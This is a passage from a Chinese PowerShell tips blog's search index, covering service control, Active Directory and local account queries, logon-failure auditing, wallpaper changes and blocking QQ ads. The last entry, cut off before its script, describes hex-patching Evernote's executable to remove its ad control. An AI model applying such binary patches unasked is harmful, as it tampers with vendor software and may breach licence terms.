操作符，您可以调整列表和排除字符。在我们的例子中，我们排除了容易拼写错的字母。","link":"/2013/12/11/creating-temporary-password/"},{"title":"PowerShell 技能连载 - 锁定屏幕","text":"借助 WPF，PowerShell 用几行代码就可以创建窗口。以下是一个有趣的关于透明屏幕覆盖层的例子。 您可以调用 Lock-Screen 并且传入一个脚本块和一个标题。PowerShell 将会用它的覆盖层锁定屏幕，再次执行代码将解锁。 function Lock-Screen([ScriptBlock] $Payload={Start-Sleep -Seconds 5}, $Title='Busy, go away.') { try { $window = New-Object Windows.Window $label = New-Object Windows.Controls.Label $label.Content = $Title $label.FontSize = 60 $label.FontFamily = 'Consolas' $label.Background = 'Transparent' $label.Foreground = 'Red' $label.HorizontalAlignment = 'Center' $label.VerticalAlignment = 'Center' $Window.AllowsTransparency = $True $Window.Opacity = .7 $window.WindowStyle = 'None' $window.Content = $label $window.Left = $window.Top = 0 $window.WindowState = 'Maximized' $window.Topmost = $true $null = $window.Show() Invoke-Command -ScriptBlock $Payload } finally { $window.Close() } } $job = { Get-ChildItem c:\\windows -Recurse -ErrorAction SilentlyContinue } Lock-Screen -Payload $job -Title 'I am busy, go away and grab a coffee...' 您很快就会发现，锁屏确实可以防止鼠标点击，但是并不会屏蔽按键。这是一个有趣的技术，不是绝对安全的锁定。","link":"/2013/12/12/use-a-lock-screen/"},{"title":"手动控制 VMware 服务","text":"VMware Workstation 想必是很多朋友的必装软件，强大的虚拟机功能已经不用多解释了。这里提点小小的内存优化建议，就是我们在安装完 VMware Workstation 之后，它默认是开机自启动的。那有人会说，打开msconfig，在启动项里将它关闭不就行了吗？其实不然，VMware的几个进程都是以服务方式启动的，vmware-authd.exe、vmnetdhcp.exe、vmnat.exe等等，如不经处理，它们会常驻在系统内存中。而我们并不是每天都会使用虚拟机，所以那些进程大部分时间是在浪费我们的系统资源。 但如果在服务里面将它们全部禁用，那么 VMware 也就不能使用了。最好的方法就是打开服务管理器，将它的几个服务项先全部右击停止，然后双击进去，在启动类型中改为“手动”。这样一来，开机就不会自动启动了。那么，要开 VMware 的时候怎么办呢？一个个手工开启？没必要，写个 PowerShell 脚本就可以了，我用的是最新版VMware Workstation 10，代码如下： 将所有 VMware 服务设置为手动： # Set-VMWareServiceToManual.ps1 Get-Service -DisplayName vmware* | % { Set-Service -Name $_.Name -StartupType Manual } 将所有 VMware 服务设置为自动（缺省）： # Set-VMWareServiceToAuto.ps1 Get-Service -DisplayName vmware* | % { Set-Service -Name $_.Name -StartupType Automatic } 启动所有 VMware 服务（准备运行 VMware 的时候）： # Start-VMWareService.ps1 Get-Service -DisplayName vmware* | % { Start-Service -Name $_.Name } 停止所有 VMware 服务（运行 VMware 完毕以后）： # Stop-VMWareService.ps1 Get-Service -DisplayName vmware* | % { Stop-Service -Name $_.Name -Force } 下载地址：VMWareService.zip","link":"/2013/12/13/manually-control-vmware-service/"},{"title":"PowerShell 技能连载 - 为 AD 用户设置缺省的 Email 地址","text":"编写 Active Directory 脚本不需要额外的 module。通过简单的 .NET 框架方法，您可以实现令人惊叹的功能。实际上，这个技术十分强大，您不应该在您的生产环境下运行以下的例子，除非您知道自己在做什么。 一下代码片段在您的 Active Directory 中查找存储于 CN=Users 并且没有邮箱地址的的所有用户。然后，脚本将为他们设置一个缺省的邮箱地址。该地址由姓名 + “mycompany.com” 组成。 # adjust LDAP path (i.e. remove CN=Users to search the entire domain): $SearchRoot = 'LDAP://CN=Users,{0}' -f ([ADSI]'').distinguishedName.ToString() # adjust LDAPFilter. Example: (!mail=*) = all users with no defined mail attribute $LdapFilter = &quot;(&amp;(objectClass=user)(objectCategory=person)(!mail=*))&quot; $Searcher = New-Object DirectoryServices.DirectorySearcher($SearchRoot, $LdapFilter) $Searcher.PageSize = 1000 $Searcher.FindAll() | ForEach-Object { $User = $_.GetDirectoryEntry() try { # Set mail attribute $User.Put(&quot;mail&quot;, ('{0}.{1}@mycompany.com' -f $user.givenName.ToString(), $user.sn.ToString())) # Commit the change $User.SetInfo() } catch { Write-Warning &quot;Problems with $user. Reason: $_&quot; } } 这个示例代码可以读取并且修改、设置任意的属性。它特别适用于不能通过 cmdlet 设置的自定义属性。","link":"/2013/12/13/setting-default-email-address-for-ad-users/"},{"title":"PowerShell 技能连载 - 查找磁盘分区详细信息","text":"要查看磁盘分区信息，请使用 WMI： Get-WmiObject -Class Win32_DiskPartition | Select-Object -Property * 然后，选择您感兴趣的属性，然后将 * 号替换成逗号分隔的属性列表。例如： Get-WmiObject -Class Win32_DiskPartition | Select-Object -Property Name, BlockSize, Description, BootPartition 如果您选择四个或四个以下的属性，结果是一个干净的表格，否则将是一个列表： 如果您想知道更多的信息，请使用 -List 参数来搜索其它 WMI 类，或者和 “disk” 有关的，或者其它完全不相关的：","link":"/2013/12/16/finding-disk-partition-details/"},{"title":"PowerShell 技能连载 - 显示 Path 环境变量","text":"当您启动一个程序时，$env:Path 环境变量列出了 Windows 搜索路径中的所有目录。类似地，$env:PSModulePath 列出了 PowerShell 搜索 PowerShell 模块（包括它的自动加载模块）的所有目录。 这些变量包含了以分号分隔的信息。所以使用 -split 操作符分隔并显示它们： 顺便说一下，第三行（在 Program Files 中的）是在 PowerShell 4.0 中才加入的。","link":"/2013/12/17/displaying-path-environment-variables/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 管理 Office365","text":"您知道吗？您也可以用 PowerShell 管理您的 Office365 账户。如果您拥有一个 Office365 账户，请试试以下脚本： $OfficeSession = New-PSSession -ConfigurationName Microsoft.Exchange `-ConnectionUri https://ps.outlook.com/powershell/ -Credential (Get-Credential) `-Authentication Basic -AllowRedirection $import = Import-PSSession $OfficeSession -Prefix Off365 Get-Command -Noun Off365* 这段代码将使用您的凭据连接 Office 365，然后导入用于管理 Office 365 的 PowerShell cmdlet。您大约可以获得 400 个新的 cmdlet。如果您收到“Access Denied”提示，那么有可能您的账户没有足够的权限，或者您敲错了密码。 注意所有导入的 cmdlet 都是以 Off365 为前缀的，所以要查看所有的邮箱，请试试以下代码： PS&gt; Get-Off365Mailbox 您可以自己选择前缀（见前面的代码），这样您可以同时通过不同的前缀连接到多个 Office365 账户。当您执行 Import-PSSession 时，您还可以省略前缀。 要查看 Office365 导出的所有命令，请使用以下代码： $import.ExportedCommands","link":"/2013/12/18/managing-office365-with-powershell/"},{"title":"PowerShell 技能连载 - 将 Windows 8.1 中的 CMD.EXE 替换为 POWERSHELL.EXE","text":"Windows 8.1 仍然在它的一些上下文菜单中提供旧的 cmd.exe 命令行窗口。在 Windows 8.1 中，要将它由 cmd.exe 改为 powershell.exe，请右键单击任务栏，然后选择属性。 然后，单击“导航”标签页，然后选中第三个选项。 下一次，当您在 Windows 8.1 中按下 WIN+X 键时，迷你菜单上将显示“PowerShell”。","link":"/2013/12/19/exchanging-cmd-exe-with-powershell-exe-in-windows-8-1/"},{"title":"PowerShell 技能连载 - 获取本地组成员","text":"在 PowerShell 中，通过 .NET Framework 3.51 或更高的版本，可以使用面向对象的方式管理本地用户和组。以下代码可以列出本机上的管理员用户： Add-Type -AssemblyName System.DirectoryServices.AccountManagement $type = New-Object DirectoryServices.AccountManagement.PrincipalContext('Machine', `$env:COMPUTERNAME) $group = [DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($type, `'SAMAccountName', 'Administrators') $group.Members | Select-Object -Property SAMAccountName, LastPasswordSet, LastLogon, Enabled 您还可以获取更多的信息，比如试着查询组本身的信息： 或者试着列出所有成员的所有属性：","link":"/2013/12/20/getting-local-group-members/"},{"title":"PowerShell 技能连载 - 搜索本地用户","text":"您知道吗？您可以搜索计算机上的本地用户，就像搜索域账户一样。 以下的示例代码搜索所有以“A”开头并且是启用状态的本地用户： Add-Type -AssemblyName System.DirectoryServices.AccountManagement $type = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext('Machine', $env:COMPUTERNAME) $UserPrincipal = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($type) # adjust your search criteria here: $UserPrincipal.Name = 'A*' # you can add even more: $UserPrincipal.Enabled = $true $searcher = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher $searcher.QueryFilter = $UserPrincipal $results = $searcher.FindAll(); $results | Select-Object -Property Name, LastLogon, Enabled 类似地，要查找所有设置了密码、密码永不过期，并且是启用状态的本地用户，试试以下代码： Add-Type -AssemblyName System.DirectoryServices.AccountManagement $type = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext('Machine', $env:COMPUTERNAME) $UserPrincipal = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($type) # adjust your search criteria here: $UserPrincipal.PasswordNeverExpires = $true $UserPrincipal.Enabled = $true $searcher = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher $searcher.QueryFilter = $UserPrincipal $results = $searcher.FindAll(); $results | Select-Object -Property Name, LastLogon, Enabled, PasswordNeverExpires","link":"/2013/12/23/searching-for-local-user-accounts/"},{"title":"PowerShell 技能连载 - 在 Windows 8.1 中管理 Windows Defender","text":"Windows 8.1 发布了一个称为“Defender”的新模块。内置的 cmdlet 使您能够管理、查看和修改 Windows Defender 反病毒程序的每一个方面。 要列出所有可用的 cmdlet，请使用以下代码： Get-Command -Module Defender 如果您没有获得任何返回信息，那么您正在运行的很可能不是 Windows 8.1，所以该模块不可用。 下一步，试着浏览这些 cmdlet。例如 Get-MpPreference，将列出当前所有偏好设置。类似地，Set-MpPreference 可以改变它们的值。 Get-MpThreatDetection 将会列出当前检测到的所有威胁（如果当前没有任何威胁，则返回空）。","link":"/2013/12/24/managing-windows-defender-in-windows-8-1/"},{"title":"PowerShell 技能连载 - 搜索并观看 PowerShell 视频","text":"PowerShell 是令人惊叹的。它可以根据您选择的关键词搜索 YouTube 视频，然后为您呈现视频，以及根据选择播放视频。 以下这段简单的脚本（需要 Internet 连接）可以列出 YouTube 上最新的“Learn PowerShell”视频。该列表使用一个 Grid View 窗口呈现，您可以在顶部使用全文搜索或者按列排序，来查找您需要的视频。 下一步，单击视频项选中它，然后单击网格右下角的“确定”按钮。 PowerShell 将会启动您的 Web 浏览器并且播放视频。太棒了！ $keyword = &quot;Learn PowerShell&quot; Invoke-RestMethod -Uri &quot;https://gdata.youtube.com/feeds/api/videos?v=2&amp;q=$($keyword.Replace(' ','+'))&quot; | Select-Object -Property Title, @{N='Author';E={$_.Author.Name}}, @{N='Link';E={$_.Content.src}}, @{N='Updated';E={[DateTime]$_.Updated}} | Sort-Object -Property Updated -Descending | Out-GridView -Title &quot;Select your '$Keyword' video, then click OK to view.&quot; -PassThru | ForEach-Object { Start-Process $_.Link } 只需要改变第一行的 $keyword 变量就可以搜索不同的视频或者主题。 请注意由于 PowerShell 3.0 的一个 bug，Invoke-RestMethod 只会返回一部分结果。PowerShell 4.0 修复了这个 bug。 译者注：由于国内暂时不可直接访问 YouTube 服务，验证本脚本需要合适的代理服务器或 VPN。","link":"/2013/12/25/search-and-view-powershell-videos/"},{"title":"PowerShell 技能连载 - 获取昨天午夜的日期值","text":"当您了解了每个 DateTime 对象支持 Add...() 方法之后，获取相对日期（例如昨天或下周）就十分容易了。以下代码可以获取昨天的时间值： $today = Get-Date $yesterday = $today.AddDays(-1) $yesterday $yesterday 的值是当前时间之前 24 小时整的值。那么如果您希望得到昨天特定时刻的值，比如说昨天午夜呢？ 如果您希望得到今天午夜的值，那么十分简单： $todayMidnight = Get-Date -Hour 0 -Minute 0 -Second 0 $todayMidnight 如果您希望得到另一天的该时间值，那么再次使用 Get-Date 来修改时间值。以代码获取昨天午夜的时间值： $today = Get-Date $yesterday = $today.AddDays(-1) $yesterday | Get-Date -Hour 0 -Minute 0 -Second 0 译者注：如果您只是需要获取昨天午夜的日期值，还可以有其它方法。如：(Get-Date).AddDays(-1).Date 或 [System.DateTime]::Today.Subtract([System.TimeSpan]::FromDays(1))。","link":"/2013/12/26/getting-yesterday-s-date-at-midnight/"},{"title":"PowerShell 技能连载 - 有序哈希表以及更改顺序","text":"有序哈希表是在 PowerShell 3.0 中增加的新特性，它在创建新对象的时候十分有用。和常规的哈希表不同，有序哈希表保存了您添加键时的顺序，您还可以控制这些键转化为对象属性时的顺序。以下是一个例子： $hashtable = [Ordered]@{} $hashtable.Name = 'Tobias' $hashtable.ID = 12 $hashtable.Location = 'Germany' New-Object -TypeName PSObject -Property $hashtable 这段代码创建了一个对象，它的属性定义严格按照它们指定时的先后顺序排列。 那么如果您希望不在尾部，例如在列表的头部增加一个属性，要怎么做呢？ $hashtable = [Ordered]@{} $hashtable.Name = 'Tobias' $hashtable.ID = 12 $hashtable.Location = 'Germany' $hashtable.Insert(0, 'Position', 'CSA') New-Object -TypeName PSObject -Property $hashtable","link":"/2013/12/27/ordered-hash-tables-and-changing-order/"},{"title":"PowerShell 技能连载 - 从多个事件日志中获取错误事件","text":"Get-EventLog 命令每次只能读取一个事件日志。然而如果您希望从多个事件日志中读取事件，您可以传入数组信息： $events = @(Get-EventLog -LogName System -EntryType Error) $events += Get-EventLog -LogName Application -EntryType Error $events 在这些例子中，使用 WMI 来查询可能会更简单一些——它可以一次性查询任意多个系统日志。 以下代码将从应用程序和系统日志中获取前 100 条错误日志（指的是总计 100 条，所以如果前 100 条错误都是应用程序日志，则当然不会包括系统错误）： Get-WmiObject -Class Win32_NTLogEvent -Filter 'Type=&quot;Error&quot; and (LogFile=&quot;System&quot; or LogFile=&quot;Application&quot;)' | Select-Object -First 100 -Property TimeGenerated, LogFile, EventCode, Message 当您将 Get-WmiObject 换成 Get-CimInstance（PowerShell 3.0 新增的命令），那么诡异的 WMI 日期格式将会被自动转换为普通的日期和时间： Get-CimInstance -Class Win32_NTLogEvent -Filter 'Type=&quot;Error&quot; and (LogFile=&quot;System&quot; or LogFile=&quot;Application&quot;)' | Select-Object -First 100 -Property TimeGenerated, LogFile, EventCode, Message","link":"/2013/12/30/getting-error-events-from-multiple-event-logs/"},{"title":"PowerShell 技能连载 - 获取最新的地震信息","text":"现代社会中，所有东西都是彼此相连的。PowerShell 可以从 web service 中获取公共数据。以下仅仅一行代码就可以为您获取最新检测到的地震以及它们的震级： Invoke-RestMethod -URI &quot;http://www.seismi.org/api/eqs&quot; | Select-Object -First 30 -ExpandProperty Earthquakes | Out-GridView","link":"/2013/12/31/getting-most-recent-earthquakes/"},{"title":"PowerShell 技能连载 - PowerShell 远程管理和大尺寸令牌问题","text":"Kerberos 令牌大小取决于用户组成员的数量。在某些重度使用组成员的企业环境中，令牌的大小可能会溢出 PowerShell 远程管理的限制。在这些情况下，PowerShell 远程管理操作会失败，提示一句模糊的信息。 要使用 PowerShell 远程管理，您可以设置两个注册表值，并且增加令牌的允许尺寸： #Source: http://www.miru.ch/how-the-kerberos-token-size-can-affect-winrm-and-other-kerberos-based-services/ New-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\HTTP\\Parameters `-Name &quot;MaxFieldLength&quot; -Value 65335 -PropertyType &quot;DWORD&quot; New-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\HTTP\\Parameters `-Name &quot;MaxRequestBytes&quot; -Value 40000 -PropertyType &quot;DWORD&quot;","link":"/2014/01/01/powershell-remoting-with-large-token-size/"},{"title":"PowerShell 技能连载 - 降低 PowerShell 进程优先级","text":"当您运行一个 PowerShell 任务时，默认情况下它的优先级是 Normal。并且如果您脚本所做的事十分消耗 CPU 的话，您机器的性能可能会受影响。 要避免这个现象，您可以将您的 PowerShell 进程设置为更低的优先级，这样它仅在 CPU 负载允许的情况下运行。这可以确保您的 PowerShell 任务不会影响其它任务的性能。 这个例子将优先级设为“Below Normal”。您也可以将它设置为“Idle”，那样您的 PowerShell 脚本仅当机器没有别的事做时才会运行。 $process = Get-Process -Id $pid $process.PriorityClass = 'BelowNormal' 译者注：可能的 PriorityClass 值为 Normal、Idle、High、RealTime、BelowNormal、AboveNormal。要找到明确的文档比较困难，但是有一个取巧的办法：故意打错。比如说我们可以打成 $process.PriorityClass = 'trudellic'，运行以后提示： Exception setting &quot;PriorityClass&quot;: &quot;Cannot convert value &quot;trudellic&quot; to type &quot;System.Diagnostics.ProcessPriorityClass&quot;. Error: &quot;Unable to match the identifier name trudellic to a valid enumerator name. 这时候可用的值在错误提示中就暴露出来了 :-)","link":"/2014/01/02/lowering-powershell-process-priority/"},{"title":"PowerShell 技能连载 - 使用 ICACLS 提高文件夹安全性","text":"在 PowerShell 系统中，控制台程序也是相同的“一等公民”。在这个例子中，New-Folder 函数使用 icacls.exe 来设置新建文件夹的权限： function New-Folder { param ( $Path, $Username ) If ( (Test-Path -Path $path) -eq $false ) { New-Item $path -Type Directory | Out-Null } icacls $path /inheritance:r /grant '*S-1-5-32-544:(OI)(CI)R' ('{0}:(OI)(CI)F' -f $username) } New-Folder 函数将创建一个新文件夹（如果它不存在），然后使用 icacls.exe 来禁止继承、允许 Administrators 组读取以及赋予指定用户完全控制权限。","link":"/2014/01/03/using-icacls-to-secure-folders/"},{"title":"PowerShell 技能连载 - 获取系统信息","text":"PowerShell 和现有的控制台程序可以很好地共存。一个最有用的是 systeminfo.exe，它可以收集各种有用的系统信息。通过导入 systeminfo.exe 提供的 CSV 信息，PowerShell 可以将文本信息转化为对象： $header = 'Hostname','OSName','OSVersion','OSManufacturer','OSConfig','Buildtype',`'RegisteredOwner','RegisteredOrganization','ProductID','InstallDate','StartTime','Manufacturer',`'Model','Type','Processor','BIOSVersion','WindowsFolder','SystemFolder','StartDevice','Culture',`'UICulture','TimeZone','PhysicalMemory','AvailablePhysicalMemory','MaxVirtualMemory',`'AvailableVirtualMemory','UsedVirtualMemory','PagingFile','Domain','LogonServer','Hotfix',`'NetworkAdapter' systeminfo.exe /FO CSV | Select-Object -Skip 1 | ConvertFrom-CSV -Header $header 当您运行这段代码时，它将停顿数秒钟，以供 systeminfo.exe 收集信息。然后，您将会获得大量的信息： 请注意 $header：这个变量定义了属性名称，并且用自定义的列表替换了缺省的表头。所以，无论操作系统是哪种语言的，这些表头永远是相同的。 您还可以将这些信息存储在一个变量中，然后分别存取其中的信息： $header = 'Hostname','OSName','OSVersion','OSManufacturer','OSConfig','Buildtype',`'RegisteredOwner','RegisteredOrganization','ProductID','InstallDate','StartTime','Manufacturer',`'Model','Type','Processor','BIOSVersion','WindowsFolder','SystemFolder','StartDevice','Culture',`'UICulture','TimeZone','PhysicalMemory','AvailablePhysicalMemory','MaxVirtualMemory',`'AvailableVirtualMemory','UsedVirtualMemory','PagingFile','Domain','LogonServer','Hotfix',`'NetworkAdapter' $result = systeminfo.exe /FO CSV | Select-Object -Skip 1 | ConvertFrom-CSV -Header $header","link":"/2014/01/06/getting-system-information/"},{"title":"PowerShell 技能连载 - 远程启动服务","text":"由于 Start-Service 命令没有 -ComputerName 参数，所以您无法简单地远程启动一个服务。然而您可以在一个 PowerShell 远程管理会话中运行 Start-Service 命令。在某些场景下，一个更简单的方法是使用 Set-Service 命令。以下代码可以在名为 Server12 的服务器上远程启动 Spooler 服务： Set-Service -Name Spooler -Status Running -ComputerName Server12 不幸的是，这个命令没有 -Force 开关。所以虽然您可以简单地启动服务，但您可能无法用这种方式停止它们。当一个服务依赖于另一个服务时，它必须使用“强制”的方式来停止。","link":"/2014/01/06/starting-services-remotely/"},{"title":"PowerShell 技能连载 - 获取远程主机的系统信息","text":"在上一个技巧当中您已学到如何用 systeminfo.exe 获取丰富的系统资料。systeminfo.exe 内置了远程的功能，所以如果您拥有了适当的权限，您可以获取远程主机的系统信息。 以下是一个简单的函数： function Get-SystemInfo { param($ComputerName = $env:ComputerName) $header = 'Hostname','OSName','OSVersion','OSManufacturer','OSConfig','Buildtype',`'RegisteredOwner','RegisteredOrganization','ProductID','InstallDate','StartTime','Manufacturer',`'Model','Type','Processor','BIOSVersion','WindowsFolder','SystemFolder','StartDevice','Culture',`'UICulture','TimeZone','PhysicalMemory','AvailablePhysicalMemory','MaxVirtualMemory',`'AvailableVirtualMemory','UsedVirtualMemory','PagingFile','Domain','LogonServer','Hotfix',`'NetworkAdapter' systeminfo.exe /FO CSV /S $ComputerName | Select-Object -Skip 1 | ConvertFrom-CSV -Header $header } 以下是简单的调用示例：","link":"/2014/01/08/getting-system-information-for-remote-systems/"},{"title":"PowerShell 技能连载 - 在 ISE 编辑器中使用块注释","text":"在 PowerShell 3.0 中，引入了一个小技巧，可以整块注释/取消注释某一段代码。 在 ISE 编辑器中，单击插入点（比如说一段代码的开头）。然后，按住 SHIFT+ALT，然后按下 ↓键。 这时在 ISE 编辑器中将显示一条细细的绿线。当您高亮选中了这个块以后，在绿线消失前，按下 #（或任何您打算放在标记的行前的字符）。类似地，您也可以整块删除字符。","link":"/2014/01/09/using-block-comment-in-the-ise-editor/"},{"title":"用 PowerShell 屏蔽腾讯 QQ 的广告","text":"非会员 QQ，在对话窗口的右上角会显示一个广告横幅，如图所示： 我们可以将 %appdata%\\Tencent\\Users\\QQ号\\QQ\\Misc.db 文件删除并且替换成一个同名文件夹，就可以屏蔽该广告： 如果您有多个 QQ 号的话，我们可以用 PowerShell 来批量完成该任务： echo '本脚本用于屏蔽 QQ 对话窗口右上方的广告条。' Read-Host '请关闭所有 QQ，按回车键继续' | Out-Null $usersDir = &quot;$($env:AppData)\\Tencent\\Users\\&quot; dir $usersDir -Directory | foreach { $qq = $_ $qqDir = Join-Path $_.FullName 'QQ' $miscDb = Join-Path $qqDir Misc.db if (Test-Path -PathType Leaf $miscDb) { echo &quot;正在禁用 $qq 的广告&quot; del $miscDb md $miscDb | Out-Null } } exit echo '处理完毕。' 您也可以从这里 下载 写好的脚本，祝您使用愉快。本方法在 QQ2013（SP6） 上验证通过。","link":"/2014/01/10/block-ad-of-tencent-qq-with-powershell/"},{"title":"PowerShell 技能连载 - 更改桌面背景","text":"PowerShell 可以通过调用 Windows API，实现更改当前桌面背景并且立即生效。以下函数实现立刻更换桌面背景： function Set-Wallpaper { param( [Parameter(Mandatory=$true)] $Path, [ValidateSet('Center', 'Stretch')] $Style = 'Stretch' ) Add-Type @&quot; using System; using System.Runtime.InteropServices; using Microsoft.Win32; namespace Wallpaper { public enum Style : int { Center, Stretch } public class Setter { public const int SetDesktopWallpaper = 20; public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02; [DllImport(&quot;user32.dll&quot;, SetLastError = true, CharSet = CharSet.Auto)] private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni); public static void SetWallpaper ( string path, Wallpaper.Style style ) { SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange ); RegistryKey key = Registry.CurrentUser.OpenSubKey(&quot;Control Panel\\\\Desktop&quot;, true); switch( style ) { case Style.Stretch : key.SetValue(@&quot;WallpaperStyle&quot;, &quot;2&quot;) ; key.SetValue(@&quot;TileWallpaper&quot;, &quot;0&quot;) ; break; case Style.Center : key.SetValue(@&quot;WallpaperStyle&quot;, &quot;1&quot;) ; key.SetValue(@&quot;TileWallpaper&quot;, &quot;0&quot;) ; break; } key.Close(); } } } &quot;@ [Wallpaper.Setter]::SetWallpaper( $Path, $Style ) } Set-Wallpaper -Path 'C:\\Windows\\Web\\Wallpaper\\Characters\\img24.jpg'","link":"/2014/01/10/change-desktop-wallpaper/"},{"title":"获取最常用的 PowerShell Cmdlet 别名","text":"我们可以对 Get-Alias 的结果进行分组和排序，看看常用的别名有哪些。 gal | group Definition | sort Count -Descending 执行结果： Count Name Group ----- ---- ----- 6 Remove-Item {del, erase, rd, ri...} 3 Move-Item {mi, move, mv} 3 Invoke-WebRequest {curl, iwr, wget} 3 Copy-Item {copy, cp, cpi} 3 Get-ChildItem {dir, gci, ls} 3 Set-Location {cd, chdir, sl} 3 Get-Content {cat, gc, type} 3 Get-History {ghy, h, history} 2 Start-Process {saps, start} 2 ForEach-Object { %, foreach} 2 Get-Location {gl, pwd} 2 Invoke-History {ihy, r} 2 Rename-Item {ren, rni} 2 Get-Process {gps, ps} 2 Write-Output {echo, write} 2 Set-Variable {set, sv} 2 Clear-Host {clear, cls} 2 Stop-Process {kill, spps} 2 New-PSDrive {mount, ndr} 2 Compare-Object {compare, diff} 2 Where-Object {?, where} 1 Receive-Job {rcjb} 1 Receive-PSSession {rcsn} 1 Measure-Object {measure} 1 Remove-PSBreakpoint {rbp} 1 Remove-PSDrive {rdr} 1 mkdir {md} ... 还可以用如下命令查看只有 1 个字母的别名（肯定最常用了）： gal | where { $_.Name.Length -eq 1 } CommandType Name ModuleName ----------- ---- ---------- Alias % -&gt; ForEach-Object Alias ? -&gt; Where-Object Alias h -&gt; Get-History Alias r -&gt; Invoke-History","link":"/2014/01/10/get-most-used-alias-of-powershell-cmdlet/"},{"title":"PowerShell 的配置和自动加载模块","text":"以下是 PowerShell 配置（profile）的相关文章： The Windows PowerShell Profile Understanding the Six PowerShell Profiles 以下是 PowerShell 自动加载模块的相关文章： Loading Modules Automatically Improving Module Auto-loading 在所有用户登录时自动运行PowerShell脚本","link":"/2014/01/11/powershell-profiles-and-module-auto-loading/"},{"title":"PowerShell 技能连载 - 查询登录失败记录","text":"只要有人使用错误的凭据登录，就会在安全日志中产生一条日志记录。以下是一个可以从安全日志中读取这些事件的函数（需要管理员特权）。它能够列出所有日志中非法的登录信息： # requires Admin privileges! function Get-LogonFailure { param($ComputerName) try { Get-EventLog -LogName security -EntryType FailureAudit -InstanceId 4625 -ErrorAction Stop @PSBoundParameters | ForEach-Object { $domain, $user = $_.ReplacementStrings[5,6] $time = $_.TimeGenerated &quot;Logon Failure: $domain\\$user at $time&quot; } } catch { if ($_.CategoryInfo.Category -eq 'ObjectNotFound') { Write-Host &quot;No logon failures found.&quot; -ForegroundColor Green } else { Write-Warning &quot;Error occured: $_&quot; } } } 请注意这个函数还可以在远程主机上运行。请使用 -ComputerName 参数来查询一台远程主机。远程主机需要运行 RemoteRegistry 服务，并且您需要在目标机器上的本地管理员权限。","link":"/2014/01/13/finding-logon-failures/"},{"title":"PowerShell 技能连载 - 查询已登录的用户","text":"有一个十分有用的控制台程序叫做 quser.exe 可以告诉您哪些用户登录到了一台机器上。该可执行程序返回的是纯文本，但通过一点点正则表达式，该文本可以转换成 CSV 并导入 PowerShell。 以下代码以对象的形式返回所有当前登录到您机器上的用户信息： (quser) -replace 's{2,}', ',' | ConvertFrom-Csv","link":"/2014/01/14/finding-logged-on-user/"},{"title":"PowerShell 技能连载 - 查找远程计算机上已登录的用户","text":"在上一个技巧当中我们使用 quser.exe 来查询本机当前登录的用户。以下是一个支持查询远程计算机上已登录用户的函数。有个额外的好处是，返回的信息附加了一个名为“ComputerName”的属性，所以当您查询多台计算机时，您将可以知道结果是属于那一台计算机的： function Get-LoggedOnUser { param([String[]]$ComputerName = $env:COMPUTERNAME) $ComputerName | ForEach-Object { (quser /SERVER:$_) -replace '\\s{2,}', ',' | ConvertFrom-CSV | Add-Member -MemberType NoteProperty -Name ComputerName -Value $_ -PassThru } } 以下是一个调用的例子，查询本地计算机以及一台远程计算机：","link":"/2014/01/15/finding-logged-on-user-on-remote-machine/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中使用块注释","text":"从 PowerShell 3.0 开始，您可以按住 ALT 键并选择一些内容，来获取一个矩形选区。 如果您尽可能地缩窄这个选区（您将只看到一条细细的蓝线），您可以方便地在选区之内增加或删除字符。只需要按下“#”键即可块注释它们，或者删除 # 号重新启用这段代码。","link":"/2014/01/16/block-comment-in-powershell-ise/"},{"title":"PowerShell 技能连载 - 在 ISE 编辑器中打开文件","text":"如果您想在 ISE 编辑器中打开一个脚本，一个快捷的方法是使用命令“ise”。例如要打开您的配置脚本（每次 ISE 启动时自动调用的脚本），请试试一下代码： PS&gt; ise $profile 您现在可以方便地增加或删除您希望 ISE 每次启动时自动执行的命令。 如果您的配置脚本不存在，以下单行的代码可以为您创建一个（它将覆盖已经存在的文件，所以只能在文件确实还不存在的时候运行它）： PS&gt; New-Item -Path $profile -ItemType File -Force 您也可以从一个 PowerShell.exe 控制台中使用“ise”命令来启动一个 ISE 编辑器。 （顺便提一下：有一个叫做 psEdit 的函数使用效果十分相似，但是只在 PowerShell ISE 内部有效，在 PowerShell.exe 控制台中无效。）","link":"/2014/01/17/opening-files-in-ise-editor/"},{"title":"技术分析：VIM，PowerShell 和签名代码","text":"摘要：在 UNIX 和 Linux 世界中，vi 和 EMACS 长期占据了处理大量代码或其他文本的最佳编辑器的位置。后来，一个称为 VIM（Vi, IMproved 的简称）的 vi 改进克隆版出现了。VIM 具有语法高亮、一个类似 vi 的命令行界面，以及更多强大的编辑大型文本工程的功能。它很快成为 Windows 世界之外最好用的文本编辑器之一。本文关注 VIM 和 Windows PowerShell 的配合使用，并讨论如何进行代码签名。 下载 PDF 文档：《technical-analysis-vim-powershell-and-signed-code.pdf》。","link":"/2014/01/17/technical-analysis-vim-powershell-and-signed-code/"},{"title":"用 PowerShell 移除 Evernote 的广告","text":"破解过程Evernote（印象笔记）免费用户的左下角有个正方形的广告，点击关闭按钮反而会出来一个对话框： 虽然破解 + 写脚本 + 写这篇博客花了一两个小时，但是如果能节约更多读者的时间，并且提高一点技术水平，也算有益了吧。 我们用 Visual Studio 中的 Spy++ 查看一下控件的窗口类名： 得到的结果是“ENAdBrowserCtrl”，从窗口类名来看，似乎是为了广告而设计的。出于保险起见，用 WinHex 搜索了一下，这个字符串只出现一次，并且是采用双字节编码的“45004E0041006400420072006F0077007300650072004300740072006C”。 我们尝试破坏这个字符串试试：用 WinHex 的“填充选块”功能，将这块区域替换成 00，然后保存运行，广告果然没有了。 但是手工修改毕竟比较麻烦，而且未来版本更新以后还要再次破解。所以简单写了个 PowerShell 脚本来自动完成破解。 PowerShell 自动化脚本请将以下代码保存成 Remove-EvernoteAD.ps1 并以管理员身份执行 